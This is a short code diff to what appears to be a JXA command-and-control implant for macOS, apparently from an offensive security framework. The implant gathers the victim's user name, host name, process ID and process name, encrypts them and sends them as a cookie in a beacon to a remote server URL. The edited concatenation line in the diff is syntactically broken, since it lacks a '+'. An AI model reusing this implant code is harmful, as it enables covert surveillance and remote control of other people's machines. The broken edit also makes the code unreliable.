@@ -19,7 +19,7 @@ var s = urls[0]
 class agent{
 	constructor(){
 		this.procInfo = $.NSProcessInfo.processInfo;
-        this.procName = $.NSProcessInfo.processName;
+        	this.procName = $.NSProcessInfo.processName;
 		this.hostInfo = $.NSHost.currentHost;
 		this.cu = ObjC.deepUnwrap(this.procInfo.userName);
 		this.pid = this.procInfo.processIdentifier;
@@ -133,7 +133,7 @@ function primern(url) {
     } else {
         el = "";
     }
-    let o = posh_implant.cu + el + ';' + posh_implant.host + ';' + posh_implant.pid + posh_implant.procName +';#REPLACEURLID#';
+    let o = posh_implant.cu + el + ';' + posh_implant.host + ';' + posh_implant.pid ';' + posh_implant.procName +';#REPLACEURLID#';
     // Encrypt o and set as cookie
     let cookie = enc(o);
     primern = get_webclient(cookie);
